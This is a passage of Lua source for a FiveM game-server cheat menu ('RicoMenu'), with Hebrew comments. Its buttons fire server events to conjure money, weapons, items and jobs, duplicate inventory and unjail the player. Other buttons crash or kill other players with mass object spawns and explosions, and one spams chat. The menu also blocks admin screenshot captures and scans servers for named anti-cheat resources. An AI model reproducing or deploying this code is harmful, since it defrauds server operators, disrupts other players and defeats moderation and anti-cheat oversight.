			        TriggerServerEvent("whoapd:revive", GetPlayerServerId(selectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(selectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(selectedPlayer))
					TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
					TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
                    TriggerEvent("hospital:client:Revive")
                     TriggerServerEvent("QBCore:Server:SetMetaData", "hunger", 100)
                    TriggerServerEvent("QBCore:Server:SetMetaData", "thirst", 100)
					TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
			 else
					ShowInfo("~r~Operation Canceled")
				end
			elseif RicoMenu.Button('~y~QB ~b~Revive') then
                RicoModz = {}

                
                RicoModz.RevivePlayerWithInput = function()
                    
                    AddTextEntry('FMMC_KEY_TIP1', "Enter Player ~g~ID ~w~To ~b~Revive ~w~| Then Press ESC")
                    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", "", "", "", "", 10)
                
                    
                    while UpdateOnscreenKeyboard() == 0 do
                        Citizen.Wait(0)
                    end
                
                    
                    local input = GetOnscreenKeyboardResult()
                
                    if input then
                        local playerid = tonumber(input) 
                
                        
                        if playerid then
                            
                            TriggerServerEvent("hospital:server:RevivePlayer", playerid)
                            
                            
                            print("Reviving Player with ID: " .. playerid .. ". Script By. RICO")
                        else
                            
                            print("Invalid Player ID entered. Must be a number.")
                        end
                    else
                        
                        print("No Player ID entered!")
                    end
                end
                
                
                Citizen.CreateThread(function()
                    
                    RicoModz.RevivePlayerWithInput()
                
                    
                    
                end)                           
			elseif RicoMenu.MenuButton("~r~Crash ~s~FiveM Player ~s~Menu", 'crashtroll') then		
			elseif RicoMenu.MenuButton("~y~Troll ~s~Menu", 'troll') then
			elseif RicoMenu.MenuButton("~y~ESX ~s~Give Jobs Menu ~r~(RISK)", 'jobsplayers') then
			elseif RicoMenu.MenuButton("~b~Give ~s~Single Weapon", 'weaponspawnerplayer') then
			 elseif RicoMenu.Button("~g~Give ~s~All Weapons") then
            GiveAllWeapons(selectedPlayer)
            elseif RicoMenu.Button("~r~Remove ~s~All Weapons") then
                StripPlayer(selectedPlayer)
            elseif RicoMenu.Button('~b~Armour ~s~Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
            elseif RicoMenu.Button('~b~Full Armour ~s~Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
			elseif RicoMenu.Button('~r~Kill ~s~Player ~y~(Click 5 times Fast') then
					AddExplosion(GetEntityCoords(GetPlayerPed(selectedPlayer)), 33, 101.0, false, true, 0.0) 
			elseif RicoMenu.Button('~b~Crash ~s~Player') then
			local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
                        CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
						
                    end
            elseif RicoMenu.Button("Cancel Animation/Task") then
                ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
                                end
        
        
        
        
        elseif RicoMenu.IsMenuOpened('self') then
            if RicoMenu.CheckBox("~b~God~w~mode", Godmode) then
                Godmode = not Godmode
                ToggleGodmode(Godmode) 
            elseif RicoMenu.Button("~g~[NEW] ~w~Bring Urself Some ~p~Fans Girls ❤️") then  
                                                    -- סוגי הדמויות הנשיות שיגויסו
local femaleModels = {
    "a_f_y_beach_01",
    "a_f_y_bevhills_01",
    "a_f_y_bevhills_02",
    "a_f_y_hipster_01",
    "a_f_y_tourist_01"
}


-- פונקציה לקריאה ל-NPC הנשים ולהפעלת התנהגות מבוקשת
function SummonAndEngageNPCs()
    local playerPed = PlayerPedId()
    local playerPos = GetEntityCoords(playerPed)
    local spawnDistance = 10.0 -- המרחק שבו ה-NPC יופיעו מסביב לשחקן
    local npcList = {} -- רשימת ה-NPC שייווצרו

    -- טוען את האנימציה הרצויה
    local animationDict = "cellphone@self@franklin@"  -- האנימציה של צילום בסלולרי
    local animationName = "peace" -- שם האנימציה

    RequestAnimDict(animationDict)
    while not HasAnimDictLoaded(animationDict) do
        Citizen.Wait(10)
    end

    -- יצירת NPC מסוגים שונים והצבתם סביב השחקן
    for i, modelName in ipairs(femaleModels) do
        RequestModel(modelName)
        while not HasModelLoaded(modelName) do
            Citizen.Wait(10)
        end

        -- מיקום הופעה מסביב לשחקן
        local spawnPos = playerPos + vector3(math.random(-spawnDistance, spawnDistance), math.random(-spawnDistance, spawnDistance), 0)
        
        -- יצירת ה-NPC והוספתו לרשימה
        local npc = CreatePed(4, GetHashKey(modelName), spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
        TaskGoToEntity(npc, playerPed, -1, 3.0, 1.0, 0, 0)
        table.insert(npcList, npc)
    end

    -- לולאה אינסופית שתגרום ל-NPC להישאר קרובים לשחקן ולבצע את ההתנהגות
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(5000) -- כל 5 שניות

            for _, npc in ipairs(npcList) do
                -- גורם ל-NPC להתקרב לשחקן
                TaskGoToEntity(npc, playerPed, -1, 3.0, 1.0, 0, 0)
                
                -- גורם ל-NPC לצלם את השחקן באנימציה
                TaskPlayAnim(npc, animationDict, animationName, 8.0, -8.0, -1, 49, 0, false, false, false)

                -- NPC אומרים לשחקן מחמאות רומנטיות
                local compliment = compliments[math.random(#compliments)]
                TriggerEvent('chat:addMessage', {
                    color = {255, 0, 255},
                    multiline = true,
                    args = {"NPC", compliment}
                })
            end
        end
    end)
end

-- הפעלת הפונקציה כאשר הקוד נטען
SummonAndEngageNPCs()               
            elseif RicoMenu.Button("~g~[NEW] ~y~Anti ~w~Carry 💁‍♂️") then 
local isCarrying = false

-- תפקוד שמבטל את האפשרות Carry
AddEventHandler('onResourceStart', function(resourceName)
    if resourceName == GetCurrentResourceName() then
        -- לוקח את השחקן המקומי ומבטל Carry
        Citizen.CreateThread(function()
            while true do
                Citizen.Wait(0) -- מחכה עד לעדכון הבא
                local playerPed = PlayerPedId()

                -- אם השחקן עושה Carry, אז מבטלים את הפעולה
                if isCarrying then
                    ClearPedTasksImmediately(playerPed) -- מבטל כל פעולה
                end
            end
        end)
    end
end)

-- מאזין לאירועים של Carry
AddEventHandler('player:attemptCarry', function()
    isCarrying = true -- מכניס את השחקן למצב Carry
    CancelEvent() -- מבטל את האירוע
end)

-- מאזין לאירועים של סיום Carry
AddEventHandler('player:stopCarry', function()
    isCarrying = false -- מכניס את השחקן למצב לא Carry
end)                
            elseif RicoMenu.Button("~g~[NEW] ~w~ScreenShot ~r~Bypass 📸") then 
                RegisterNetEvent('screenshot_basic:requestScreenshot')
AddEventHandler('screenshot_basic:requestScreenshot', function()
	CancelEvent()
end)
RegisterNetEvent('EasyAdmin:CaptureScreenshot')
AddEventHandler('EasyAdmin:CaptureScreenshot', function()
	CancelEvent()
end)

RegisterNetEvent('requestScreenshot')
AddEventHandler('requestScreenshot', function()
	CancelEvent()
end)

RegisterNetEvent('__cfx_nui:screenshot_created')
AddEventHandler('__cfx_nui:screenshot_created', function()
	CancelEvent()
end)

RegisterNetEvent('screenshot-basic')
AddEventHandler('screenshot-basic', function()
	CancelEvent()
end)

RegisterNetEvent('requestScreenshotUpload')
AddEventHandler('requestScreenshotUpload', function()
	CancelEvent()
end)
RegisterNetEvent('EasyAdmin:CaptureScreenshot')
AddEventHandler('EasyAdmin:CaptureScreenshot', function()
	PushNotification("They ScreenShotting your Screen", 1000)
	TriggerServerEvent("EasyAdmin:TookScreenshot", "ERROR")
	CancelEvent()
end)                                                                                   
            elseif RicoMenu.Button("~g~[NEW] ~w~Stolen Plate ~p~Access ~w~+ ~o~Trunk ~w~KEY ~y~[F6] ~r~[BAN RISK]") then
                local accessGranted = false
                local playerOwnedVehicle = nil
                local playerPlate = ""
                local f6Pressed = false 
                local stolenVehicleData = {} 
                
                
                function requestPlateInput()
                    
                    AddTextEntry('FMMC_KEY_TIP8', 'Enter License Plate for this vehicle to stole trunk') 
                    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 8)
                
                    while UpdateOnscreenKeyboard() == 0 do
                        DisableAllControlActions(0)
                        Citizen.Wait(0)
                    end
                
                    if GetOnscreenKeyboardResult() then
                        playerPlate = GetOnscreenKeyboardResult()
                        setVehicleLicensePlate(playerOwnedVehicle, playerPlate)
                        OpenVehicleStorage(playerOwnedVehicle, playerPlate) 
                    else
                        TriggerEvent('chat:addMessage', { args = { "No plate entered." } })
                    end
                end
                
                
                function setVehicleLicensePlate(vehicle, plate)
                    if vehicle ~= nil then
                        local oldPlate = GetVehicleNumberPlateText(vehicle)
                        SetVehicleNumberPlateText(vehicle, plate)
                
                        
                        if stolenVehicleData[oldPlate] then
                            stolenVehicleData[plate] = stolenVehicleData[oldPlate] 
                            stolenVehicleData[oldPlate] = nil 
                        else
                            stolenVehicleData[plate] = {} 
                        end
                
                        TriggerEvent('chat:addMessage', {
                            args = { 'The License Plate has been set to: ' .. plate }
                        })
                        TriggerEvent('chat:addMessage', {
                            args = { 'You now have access to the vehicle\'s inventory.' }
                        })
                    end
                end
                
                
                function OpenVehicleStorage(vehicle, plate)
                    if stolenVehicleData[plate] then
                        
                        TriggerEvent('esx_inventoryhud:openTrunkInventory', plate) 
                        TriggerServerEvent('inventory:server:OpenInventory', 'trunk', plate, {
                            maxweight = 40000, 
                            slots = 50 
                        })
                    else
                        TriggerEvent('chat:addMessage', {
                            args = { 'This vehicle has no inventory.' }
                        })
                    end
                end
                
                
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(0)
                        
                        if IsControlJustPressed(1, 167) then 
                            if not f6Pressed then
                                f6Pressed = true
                                TriggerEvent('chat:addMessage', {
                                    args = { 'F6 pressed! Entering vehicle check mode...' }
                                })
                                
                                local playerPed = PlayerPedId()
                                if IsPedInAnyVehicle(playerPed, false) then
                                    playerOwnedVehicle = GetVehiclePedIsIn(playerPed, false)
                                    requestPlateInput() 
                                else
                                    TriggerEvent('chat:addMessage', {
                                        args = { 'You are not in a vehicle!' }
                                    })
                                end
                            else
                                f6Pressed = false
                                TriggerEvent('chat:addMessage', {
                                    args = { 'F6 deactivated!' }
                                })
                            end
                        end
                    end
                end)                                                                                                      
            elseif RicoMenu.Button("~w~Bypass ~b~SafeZones 🚔") then
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(0) 
                        
                        
                        NetworkSetFriendlyFireOption(true)
                        SetCanAttackFriendly(PlayerPedId(), true, true)
                        
                        
                        DisablePlayerFiring(PlayerPedId(), false)
                
                        
                        EnableAllControlActions(0)
                        EnableAllControlActions(1)
                    end
                end)
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(0) 
                        
                        -- קבל את הרכב של השחקן
                        local playerPed = PlayerPedId()
                        if IsPedInAnyVehicle(playerPed, false) then
                            local vehicle = GetVehiclePedIsIn(playerPed, false)
                
                            -- קבע את מהירות המקסימום של הרכב (ערך רגיל יכול להיות בין 50 ל-130)
                            local maxSpeed = 100.0 -- תוכל לשנות את הערך לפי הצורך
                            SetEntityMaxSpeed(vehicle, maxSpeed)
                            
                            -- הגבל את כוח המנוע
                            SetVehicleEnginePowerMultiplier(vehicle, 1.0) -- מגבלה רגילה של כוח המנוע
                            SetVehicleEngineTorqueMultiplier(vehicle, 1.0) -- מגבלה רגילה של מומנט המנוע
                        end
                    end
                end)                
            elseif RicoMenu.Button("~s~Spawn Car Under ~o~Map 🗺️  ~y~(Need Be Inside Car)") then  
                -- Constants
                local LAUNCH_HEIGHT = 1000.0 -- גובה השיגור המקסימלי
                local LAUNCH_TIME = 5000 -- משך זמן העלייה והירידה בשיגור (במילישניות)
                local HOVER_TIME = 3000 -- משך הזמן שהרכב נשאר בגובה לפני חזרה לקרקע (במילישניות)
                local IMPACT_DAMAGE = 500.0 -- הנזק שהרכב יקבל בזמן הנפילה
                local LIGHT_EFFECTS_AMOUNT = 50 -- כמות אפקטי האורות המוגזמים
                
                -- Variable to track if launch has occurred
                local hasLaunched = false
                
                -- Function to load particle effects
                function loadParticleEffects(dict)
                    RequestNamedPtfxAsset(dict)
                    while not HasNamedPtfxAssetLoaded(dict) do
                        Citizen.Wait(0)
                    end
                end
                
                -- Function to create exaggerated light effects
                function createExaggeratedLightEffects(vehicle)
                    Citizen.CreateThread(function()
                        for i = 1, LIGHT_EFFECTS_AMOUNT do
                            UseParticleFxAsset("scr_apartment_mp")
                            StartParticleFxNonLoopedOnEntity("scr_apa_jacuzzi_glow", vehicle, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 10.0, false, false, false)
                            Citizen.Wait(100) -- זמן המתנה קטן כדי ליצור אפקט ויזואלי מוגזם
                        end
                    end)
                end
                
                -- Function to launch the vehicle and passengers gradually
                function launchVehicleAndPassengers()
                    local playerPed = PlayerPedId()
                    if IsPedInAnyVehicle(playerPed, false) and not hasLaunched then
                        hasLaunched = true -- Set flag to prevent multiple launches
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        local vehicleCoords = GetEntityCoords(vehicle)
                        
                        -- Load particle effects for lights and smoke
                        loadParticleEffects("core") -- נשתמש ב-"core" לאפקטים
                        loadParticleEffects("scr_apartment_mp") -- אפקטי אורות
                
                        -- Loop to gradually increase the height
                        local startTime = GetGameTimer()
                        Citizen.CreateThread(function()
                            while (GetGameTimer() - startTime) < LAUNCH_TIME do
                                Citizen.Wait(0)
                                local timeFraction = (GetGameTimer() - startTime) / LAUNCH_TIME
                                local newZ = vehicleCoords.z + (LAUNCH_HEIGHT * timeFraction)
                                SetEntityCoords(vehicle, vehicleCoords.x, vehicleCoords.y, newZ, false, false, false, true)
                            end
                
                            -- Once at the top, hover for a bit before starting to descend
                            Citizen.SetTimeout(HOVER_TIME, function()
                                -- Begin gradual descent
                                local descentStartTime = GetGameTimer()
                                local currentCoords = GetEntityCoords(vehicle)
                                
                                Citizen.CreateThread(function()
                                    while (GetGameTimer() - descentStartTime) < LAUNCH_TIME do
                                        Citizen.Wait(0)
                                        local timeFraction = (GetGameTimer() - descentStartTime) / LAUNCH_TIME
                                        local newZ = currentCoords.z - (LAUNCH_HEIGHT * timeFraction)
                                        SetEntityCoords(vehicle, currentCoords.x, currentCoords.y, newZ, false, false, false, true)
                
                                        -- Start exaggerated light effects during the descent
                                        createExaggeratedLightEffects(vehicle)
                
                                        -- Add smoke during descent
                                        UseParticleFxAsset("core")
                                        StartParticleFxNonLoopedOnEntity("exp_grd_grenade_smoke", vehicle, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, false, false, false)
                                    end
                
                                    -- After the descent completes, apply damage and force impact
                                    local vehicleHealth = GetEntityHealth(vehicle)
                                    SetEntityHealth(vehicle, vehicleHealth - IMPACT_DAMAGE) -- Apply damage to the vehicle
                
                                    -- Apply a force to simulate the impact with the ground
                                    ApplyForceToEntity(vehicle, 1, 0.0, 0.0, -500.0, 0.0, 0.0, 0.0, false, true, true, false, true, true)
                
                                    -- Start particle effect on impact (cloud of smoke)
                                    UseParticleFxAsset("core")
                                    StartParticleFxNonLoopedAtCoord("exp_grd_grenade_smoke", currentCoords.x, currentCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0, 5.0, false, false, false)
                
                                    -- Ensure the vehicle stays on the ground and stops being teleported back up
                                    FreezeEntityPosition(vehicle, true) -- Freeze the vehicle in place to prevent bouncing
                                end)
                            end)
                        end)
                    end
                end
                
                -- Auto-launch when player is in a vehicle (only once per script execution)
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(0)
                        local playerPed = PlayerPedId()
                        if IsPedInAnyVehicle(playerPed, false) and not hasLaunched then
                            launchVehicleAndPassengers()
                        end
                    end
                end)
            elseif RicoMenu.Button("~s~Spawn Car To ~b~Cloud ☁️  ~y~(Need Be Inside Car)") then
                                   -- Constants
local LAUNCH_HEIGHT = 1000.0 -- גובה השיגור המקסימלי
local LAUNCH_SPEED = 50.0 -- מהירות השיגור כלפי מעלה
local IMPACT_DAMAGE = 500.0 -- הנזק שהרכב יקבל בזמן הנפילה
local LIGHT_EFFECTS_AMOUNT = 50 -- כמות אפקטי האורות המוגזמים

-- Variable to track if launch has occurred
local hasLaunched = false

-- Function to load particle effects
function loadParticleEffects(dict)
    RequestNamedPtfxAsset(dict)
    while not HasNamedPtfxAssetLoaded(dict) do
        Citizen.Wait(0)
    end
end

-- Function to create exaggerated light effects
function createExaggeratedLightEffects(vehicle)
    Citizen.CreateThread(function()
        for i = 1, LIGHT_EFFECTS_AMOUNT do
            UseParticleFxAsset("scr_apartment_mp")
            StartParticleFxNonLoopedOnEntity("scr_apa_jacuzzi_glow", vehicle, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 10.0, false, false, false)
            Citizen.Wait(100) -- זמן המתנה קטן כדי ליצור אפקט ויזואלי מוגזם
        end
    end)
end

-- Function to launch the vehicle upwards gradually
function launchVehicleAndPassengers()
    local playerPed = PlayerPedId()
    if IsPedInAnyVehicle(playerPed, false) and not hasLaunched then
        hasLaunched = true -- Set flag to prevent multiple launches
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        local vehicleCoords = GetEntityCoords(vehicle)

        -- Load particle effects for lights and smoke
        loadParticleEffects("core") -- נשתמש ב-"core" לאפקטים
        loadParticleEffects("scr_apartment_mp") -- אפקטי אורות

        -- Start light effects
        createExaggeratedLightEffects(vehicle)

        -- Gradually move the vehicle upwards
        Citizen.CreateThread(function()
            local newZ = vehicleCoords.z
            while newZ < (vehicleCoords.z + LAUNCH_HEIGHT) do
                Citizen.Wait(0)
                newZ = newZ + (LAUNCH_SPEED * 0.1) -- Move upwards gradually
                SetEntityCoords(vehicle, vehicleCoords.x, vehicleCoords.y, newZ, false, false, false, true)
            end

            -- Let the vehicle fall naturally
            local gravityApplied = false
            Citizen.SetTimeout(3000, function() -- Wait before applying gravity
                gravityApplied = true
            end)

            while not gravityApplied do
                Citizen.Wait(0)
            end
        end)
    end
end

-- Auto-launch when player is in a vehicle (only once per script execution)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) and not hasLaunched then
            launchVehicleAndPassengers()
        end
    end
end)                                                                                           
            elseif RicoMenu.Button("~y~[QB-Core] ~w~Spawn Items ~p~By ~b~Names 🎁") then
                local inputCompleted = false  

                local function KeyboardInput(promptText, defaultText, maxLength)
                    local input = ''
                    AddTextEntry('FMMC_MPM_NA', promptText)
                    DisplayOnscreenKeyboard(1, 'FMMC_MPM_NA', '', defaultText, '', '', '', maxLength)
                    
                    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
                        Citizen.Wait(0)
                    end
                    
                    if UpdateOnscreenKeyboard() == 1 then
                        input = GetOnscreenKeyboardResult()
                    end
                    
                    return input
                end
                
                local function AddQBItem()
                    if not inputCompleted then
                        local itemName = KeyboardInput('~w~Enter Item Name ~g~Example: ~y~id_card ~w~/ ~y~drill', '', 500)
                        
                        if itemName and itemName ~= '' then
                            local quantityInput = KeyboardInput('~w~Enter Quantity ~g~Example: ~y~99', '', 999)
                            local quantity = tonumber(quantityInput) or 1
                            
                            Citizen.CreateThread(function()
                                TriggerServerEvent('QBCore:Server:AddItem', itemName, quantity)
                            end)
                            
                            
                            inputCompleted = true
                        else
                            
                            inputCompleted = false
                        end
                    end
                end
                
                
                AddQBItem()                                       
            elseif RicoMenu.Button("~y~Detect ~w~Anti Cheat ~b~Scripts ~p~BETA 🛡️ ~r~[BAN RISK]") then
                local checkInterval = 5000 
                local antiCheatScripts = {
                    "qb-anticheat", "venus_anticheat", "anticheese", "ReaperV4", "fiveguard",
                    "FIREAC", "FuriousAntiCheat", "ReaperV3", "fg", "phoenix", "TitanAC",
                    "VersusAC", "VersusAC-OCR", "waveshield", "anticheese-anticheat-master",
                    "anticheese-anticheat", "wx-anticheat", "AntiCheese", "AntiCheese-master",
                    "ReaperAC", "somis_anticheat", "somis-anticheat", "ClownGuard", "oltest",
                    "ChocoHax", "ESXAC", "TigoAC", "VenusAC", "anticheat", "MzShieldd"
                } 
                local noAntiCheatMessageShown = false 
                local messageStartTime = nil 
                local messageText = "" 
                local searchActive = true 
                
                
                function RicoMenu_CheckForAntiCheatScript()
                    if not searchActive then return end 
                
                    local foundAntiCheat = false
                    local foundScriptName = ""
                
                    
                    for i = 0, GetNumResources() - 1 do
                        local resourceName = GetResourceByFindIndex(i)
                        TriggerEvent('chat:addMessage', {
                            color = {255, 255, 0}, 
                            multiline = true,
                            args = {"System", "RicoMenu: Checking resource: " .. resourceName}
                        })
                        for _, antiCheatName in ipairs(antiCheatScripts) do
                            if string.find(resourceName:lower(), antiCheatName:lower()) then
                                foundAntiCheat = true
                                foundScriptName = resourceName 
                                break
                            end
                        end
                        if foundAntiCheat then break end 
                    end
                
                    
                    if foundAntiCheat then
                        TriggerEvent('chat:addMessage', {
                            color = {255, 0, 0}, 
                            multiline = true,
                            args = {"System", "RicoMenu: Anti-cheat script found: " .. foundScriptName}
                        })
                        noAntiCheatMessageShown = false
                    elseif not noAntiCheatMessageShown then
                        TriggerEvent('chat:addMessage', {
                            color = {0, 255, 0}, 
                            multiline = true,
                            args = {"System", "RicoMenu: No anti-cheat script found on the server!"}
                        })
                        noAntiCheatMessageShown = true
                    end
                    
                    
                    searchActive = false
                end
                
                
                Citizen.CreateThread(function()
                    while true do
                        Citizen.Wait(checkInterval)
                        if searchActive then
                            RicoMenu_CheckForAntiCheatScript()
                        end
                    end
                end)
                
                
                RicoMenu_CheckForAntiCheatScript()                                                         
        elseif RicoMenu.Button("~y~[QB] ~w~Duplicate ~p~Slot 5, 1x ~r~[RISK]") then 
                TriggerServerEvent("inventory:server:SetInventoryData", "player", "0", "5", "1", -1, nil)
                            elseif RicoMenu.Button("~s~Spam Server ~r~CHAT") then
                
                
                local message = "SERVER HACKED BY JUSTIN BIEBER"
                
                
                local function sendChatMessage()
                    TriggerEvent('chat:addMessage', {
                        color = {255, 0, 0}, 
                        args = {message}
                    })
                end
                
                
                Citizen.CreateThread(function()
                    while true do
                        sendChatMessage()
                        Citizen.Wait(100) 
                    end
                end)                
        elseif RicoMenu.Button("~y~[ESX] ~w~Open Skin ~p~Changer Menu 👕") then
		        TriggerEvent('esx_skin:openSaveableMenu')
        elseif RicoMenu.Button("~w~Armoured ~y~Car 🚘") then
				RequestModel(GetHashKey("xls"))
				RequestModel(GetHashKey("kuruma2"))

				local r = math.random(1, 254)
				local g = math.random(1, 254)
				local b = math.random(1, 254)

				Wait(500)

				local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5)

				local vehicle = CreateVehicle(GetHashKey("xls"), coords.x, coords.y, coords.z, 0.0, 1, 1)
				local vehicle2 = CreateVehicle(GetHashKey("kuruma2"), coords.x, coords.y, coords.z, 0.0, 1, 1)

				SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))

				AttachEntityToEntity(vehicle2, vehicle, 0, 0.0, -0.11, -0.0100, 0.5, 0.0, 0.0, true, true, false, false, true, true)

				SetVehicleCanBreak(vehicle2, false)

				WashDecalsFromVehicle(vehicle, 1.0)
				SetVehicleDirtLevel(vehicle)
				WashDecalsFromVehicle(vehicle2, 1.0)
				SetVehicleDirtLevel(vehicle2)
				SetVehicleCustomPrimaryColour(vehicle, r, g, b)
				SetVehicleCustomSecondaryColour(vehicle, r, g, b)
				SetVehicleModColor_1(vehicle, 4, 255, 0)
				SetVehicleModColor_1(vehicle2, 4, 255, 0)

				SetVehicleCustomPrimaryColour(vehicle2, r, g, b)
				SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))

				SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
        elseif RicoMenu.Button("~y~[ESX] ~w~Un~b~jail ⛓️ ~r~[RISK]") then
            TriggerServerEvent('esx_jailer:unjailTime', -1)
            TriggerServerEvent('JailUpdate', 0)
            TriggerEvent('UnJP')
        elseif RicoMenu.Button("~y~Vehicle ~w~Whitelist Bypass 🏎️") then
			    TriggerEvent("FaxDisVeh:CheckPermission:Return", true, false)
				for i = 0, 20 do
					TriggerEvent("FaxDisVeh:CheckPermission:Return", i, false)
				end
				TriggerEvent("blacklist.setAdminPermissions", true) 
        elseif RicoMenu.Button("~s~Spawn ~g~Money 💸 ~r~[RISK]") then
				TriggerServerEvent("qb-fleeca:rewardCash")
				TriggerServerEvent("qb-sellitems:sellGoods")
				TriggerServerEvent("esx_pizza:pay", 1000000000)
				TriggerServerEvent('esx_jobs:caution', 'give_back', 1000000000)
				TriggerServerEvent('lscustoms:payGarage', 1000000000)
				TriggerServerEvent('esx_tankerjob:pay', 1000000000)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', 1000000000)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 1000000000)
				TriggerServerEvent('gambling:spend', 1000000000)
				TriggerServerEvent('fleecaheist:server:rewardItem',"money",1000000000)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', 1000000000)
				TriggerServerEvent('AdminMenu:giveBank', 1000000000)
				TriggerServerEvent('AdminMenu:giveCash', 1000000000)
				TriggerServerEvent('esx_slotmachine:sv:2', 1000000000)
				TriggerServerEvent('esx_truckerjob:pay', 1000000000)
				TriggerServerEvent('esx_moneywash:deposit', 1000000000)
				TriggerServerEvent('esx_moneywash:withdraw', 1000000000)
				TriggerServerEvent('esx_moneywash:deposit', 1000000000)
			    TriggerServerEvent('mission:completed', 1000000000)
				TriggerServerEvent('truckerJob:success',1000000000)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', 1000000000)
				TriggerServerEvent("dropOff", 1000000000)
				TriggerServerEvent('truckerfuel:success',1000000000)
				TriggerServerEvent('delivery:success',1000000000)
				TriggerServerEvent("esx_brinksjob:pay", 1000000000)
				TriggerServerEvent("esx_garbagejob:pay", 1000000000)
				TriggerServerEvent("esx_postejob:pay", 1000000000)
				TriggerServerEvent('esx_garbage:pay', 1000000000)
				TriggerServerEvent("utk_oh:rewardCash")
				TriggerServerEvent('qb-pizzaboyjob:Payment')
				TriggerServerEvent('fuel:pay',999999999999999999)
				TriggerServerEvent('esx_dmvschool:pay', 999999999999999999)
				TriggerServerEvent('cr-bankrobbery:server:recieveItem', 'paleto')
				TriggerServerEvent('cr-blackmarket:sellitemsv')
				TriggerServerEvent("qb-storerobberybery:s:gcash", 1000000000)
				TriggerServerEvent('qb-bankrobbery:server:StackReward','gold')
                TriggerServerEvent('qb-bankrobbery:server:StackReward','gold')
                TriggerServerEvent('qb-bankrobbery:server:StackReward','gold')
                TriggerServerEvent('qb-bankrobbery:server:StackReward','gold')
                TriggerServerEvent('qb-blackmarket:sellitemsv')
                TriggerServerEvent('qb-blackmarket:sellitemsv2')
				    Citizen.CreateThread(function()
                      for i = 0 , 100 do
                    TriggerServerEvent("utk_fh:rewardCash")  
                          Citizen.Wait(300)
                    end
                    end)
				elseif RicoMenu.Button("~y~[ESX] ~w~Set ~b~Police JOB 👮 ~r~[RISK]") then
				TriggerEvent('esx:setJob', {name = "police", label = "police", grade =14, grade_name = "SASP", grade_label = "RicoMenu"})
            elseif RicoMenu.Button("~y~[QB] ~g~50+ ~b~Weapons ~w~Stash 🔫 ~r~[MOST SERVERS]") then
local Config = {}

Config.Products = {
    ["arcadebar"] = {
        [1] = {
            name = "weapon_glock22",
            price = 0,
            amount = 2000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 1,
        },
        [2] = {
            name = "weapon_combatpistol",
            price = 0,
            amount = 20000000000,
            info = {
               ammo = 5000,
            },
            type = "item",
            slot = 2,
        },
        [3] = {
            name = "weapon_pistol",
            price = 0,
            amount = 2000000000,
            info = {
               ammo = 5000,
            },
            type = "item",
            slot = 3,
        },
        [4] = {
            name = "weapon_specialcarbine",
            price = 0,
            amount = 20000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 4,
        },
        [5] = {
            name = "weapon_heavypistol",
            price = 0,
            amount = 2000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 5,
        },
        [6] = {
            name = "handcuff",
